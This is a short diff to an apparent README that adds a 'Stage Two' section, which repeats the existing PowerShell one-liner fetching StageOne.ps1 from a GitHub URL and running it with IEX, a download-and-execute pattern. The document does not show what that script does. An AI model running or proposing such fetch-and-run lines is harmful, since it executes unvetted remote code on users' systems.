@@ -13,4 +13,8 @@ sudo chmod +x $(find /PATH/)
 ~~~
 IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/HeeresS/Small-Code/main/StageOne.ps1'); Invoke-StageOne
 ~~~
+## Stage Two
+~~~
+IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/HeeresS/Small-Code/main/StageOne.ps1'); Invoke-StageOne
+~~~
 
